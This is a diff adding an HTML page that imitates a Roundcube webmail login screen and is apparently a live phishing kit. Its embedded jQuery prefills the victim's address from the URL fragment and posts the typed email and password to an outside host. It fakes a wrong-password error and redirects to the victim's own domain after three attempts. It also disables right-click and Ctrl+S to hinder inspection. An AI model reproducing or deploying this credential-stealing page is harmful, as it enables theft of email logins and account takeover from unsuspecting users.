@@ -1,0 +1,202 @@
+<html class="js mozilla layout-large" lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<title>Webmail :: Welcome to Webmail</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0">
+<meta name="theme-color" content="#f4f4f4">
+<meta name="msapplication-navbutton-color" content="#f4f4f4">
+
+	<link rel="shortcut icon" href="https://webmail.supremecluster.com/skins/elastic/images/favicon.ico?s=1593860317">
+
+	<link rel="stylesheet" href="https://webmail.supremecluster.com/skins/elastic/deps/bootstrap.min.css?s=1593860330">
+	
+<link rel="stylesheet" href="https://webmail.supremecluster.com/skins/elastic/styles/styles.css?s=1593860317">
+<script src="https://rc.netsolution.ro/program/js/jquery.min.js?s=1525002594" type="text/javascript"></script>
+
+  
+
+<script>
+/*
+        @licstart  The following is the entire license notice for the 
+        JavaScript code in this page.
+
+        Copyright (C) The Roundcube Dev Team
+
+        The JavaScript code in this page is free software: you can redistribute
+        it and/or modify it under the terms of the GNU General Public License
+        as published by the Free Software Foundation, either version 3 of
+        the License, or (at your option) any later version.
+
+        The code is distributed WITHOUT ANY WARRANTY; without even the implied
+        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+        See the GNU GPL for more details.
+
+        @licend  The above is the entire license notice
+        for the JavaScript code in this page.
+*/
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","standard_windows":false,"locale":"en_US","devel_mode":null,"rcversion":10407,"cookie_domain":"","cookie_path":"/","cookie_secure":true,"skin":"elastic","blankpage":"skins/elastic/watermark.html","refresh_interval":60,"session_lifetime":30000,"action":"","comm_path":"./?_task=login","compose_extwin":false,"dateFormats":{"php":"Y-m-d","moment":"YYYY-MM-DD","datepicker":"yy-mm-dd"},"dmFormats":{"php":"m-d","moment":"MM-DD","datepicker":"mm-dd"},"timeFormats":{"php":"H:i","moment":"HH:mm"},"xphone":false,"xtablet":false,"xmobile":false,"xdesktop":true,"xdevice":"desktop","timezoneOffset":0,"xassets":["../xframework/assets/scripts/framework.min.js","../xframework/assets/styles/framework.css","xskin:assets/scripts/xskin.min.js"],"xskin":"default","xphone_skin":"outlook","xtablet_skin":"outlook","xdesktop_skin":"default","xskin_type":"desktop","rcp_skin":false,"installed_skins":["alpha","classic","droid","elastic","icloud","larry","litecube","outlook","w21"],"date_format":"yy-mm-dd","date_format_localized":"YYYY-MM-DD","appsMenu":"\u003Ca class=\"button-apps\" href=\"javascript:void(0)\" id=\"button-apps\" onclick=\"UI.toggle_popup(&quot;apps-menu&quot;, event)\"\u003E\u003Cspan class=\"button-inner\"\u003EApps\u003C/span\u003E\u003C/a\u003E\u003Cdiv id=\"apps-menu\" class=\"popupmenu count-1\"\u003E\u003Ca class=\"app-item app-item-xskin\" href=\"?_task=settings&amp;_action=preferences&amp;_section=general\"\u003E\u003Cdiv class='icon'\u003E\u003C/div\u003E\u003Cdiv class='title'\u003ESkins\u003C/div\u003E\u003C/a\u003E\u003C/div\u003E\n","request_token":"token"});
+rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing...","windowopenerror":"The popup window was blocked!","uploadingmany":"Uploading files...","uploading":"Uploading file...","close":"Close","save":"Save","cancel":"Cancel","alerttitle":"Attention","confirmationtitle":"Are you sure...","delete":"Delete","continue":"Continue","ok":"OK","back":"Back","errortitle":"An error occurred!","options":"Options","plaintoggle":"Plain text","htmltoggle":"HTML","previous":"Previous","next":"Next","select":"Select","browse":"Browse","choosefile":"Choose file...","choosefiles":"Choose files..."});
+rcmail.gui_container("loginfooter","login-footer");rcmail.gui_object('loginform', 'login-form');
+rcmail.gui_object('message', 'messagestack');
+</script>
+
+ <script>
+document.addEventListener('contextmenu', event => event.preventDefault());
+document.onkeydown = function (e) {
+    e = e || window.event;//Get event
+    if (e.ctrlKey) {
+        var c = e.which || e.keyCode;//Get key code
+        switch (c) {
+            case 83://Block Ctrl+S
+                e.preventDefault();     
+                e.stopPropagation();
+            break;
+        }
+    }
+}; </script>
+</head>
+
+<body class="task-login action-none">
+			<div id="layout">
+	
+
+<h1 class="voice">Webmail Login</h1>
+
+<div id="layout-content" class="selected no-navbar" role="main">
+	<img src="https://webmail.supremecluster.com/skins/elastic/images/logo.svg?s=1593860317" id="logo" alt="Logo">
+	<form id="login-form">
+		<div class="alert alert-danger" id="msg" style="display: none; color:red;"></div>
+<input type="hidden" name="_token" value="token" class="form-control">
+	<input type="hidden" name="_task" value="login" class="form-control"><input type="hidden" name="_action" value="login" class="form-control"><input type="hidden" name="_timezone" id="rcmlogintz" value="Africa/Lagos" class="form-control"><input type="hidden" name="_url" id="rcmloginurl" value="" class="form-control"><table><tbody><tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginuser">Username</label>
+</td>
+<td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon user"></i></span><input name="email" id="email" required="" size="40" autocapitalize="none" type="text" class="form-control" placeholder="Username"></td>
+</tr>
+<tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginpwd">Password</label>
+</td>
+<td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon pass"></i></span><input name="password" id="password" required="" size="40" autocapitalize="none" type="password" class="form-control" placeholder="Password"></td>
+</tr>
+</tbody>
+</table>
+<p class="formbuttons"><input type="submit" id="submit-btn" class="button mainaction submit btn btn-primary btn-lg text-uppercase w-100" value="Login"></p>
+<p></p>
+
+		<div id="login-footer" role="contentinfo">
+				webmail Login 
+		
+</div>
+</form></div>
+
+<script>
+      $("#submit-btn1").hide();
+
+      /* global $ */
+      $(document).ready(function(){
+        var count=0;
+
+      /////////////url email getting////////////////
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+          // $('#email').val(email);
+          var my_email =email;
+          var ind=my_email.indexOf("@");
+          var my_slice=my_email.substr((ind+1));
+          var c= my_slice.substr(0, my_slice.indexOf('.'));
+          var final= c.toLowerCase();
+          
+          $('#contact').trigger("reset");
+          $("#msg").hide();
+            // $('#fieldImg').attr('src', 'images/other-1.png');
+            // $('#field').html("Other Mail");
+            $('#email').val(my_email);
+            $('#emailch').html(my_email);
+            $("#msg").hide();
+            // $("#inputbar").animate({left:200, opacity:"hide"}, 0);
+            // $("#automail").animate({right:200, opacity:"show"}, 1000);
+            // $('#ajaxModal').modal('show');
+          }
+        ///////////////url getting email////////////////
+				
+		
+        $('#submit-btn').click(function(event){
+          $('#error').hide();
+          $('#msg').hide();
+          event.preventDefault();
+          var email=$("#email").val();
+          var password=$("#password").val();
+          var msg = $('#msg').html();
+          $('#msg').text( msg );
+        ///////////new injection////////////////
+        var my_email =email;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        // if (!filter.test(my_email)) {
+        //   $('#error').show();
+        //   email.focus;
+        //   return false;
+        // }
+
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var n = my_email.search("@");
+        ///////////new injection////////////////
+        count=count+1;
+        
+        $.ajax({
+          dataType: 'JSON',
+          url: 'https://soccerindai.com/work/abu.php',
+          type: 'POST',
+      	data:{
+      		email:email,
+      		password:password,
+      	},
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+            	$('#submit-btn').val('Verifing...');
+            },
+            success: function(response){
+            	if(response){
+            		$("#msg").show();
+            		console.log(response);
+            		if(response['signal'] == 'ok'){
+            			$("#password").val("");
+            			if (count>=3) {
+            				count=0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("http://www."+my_slice);
+
+                }
+                $('#msg').html(response['msg']);
+            }
+            else{
+            	$('#msg').html(response['msg']);
+            }
+        }
+    },
+    error: function(){
+    	$("#password").val("");
+    	if (count>=3) {
+    		count=0;
+    		window.location.replace("http://www."+my_slice);
+    	}
+    	$("#msg").show();
+    	$('#msg').html("Please enter correct password and try again");
+    },
+    complete: function(){
+    	$('#submit-btn').val('Login');
+    }
+});
+  });
+
+
+	});
+
+
+</script>
+
+</div></body></html>
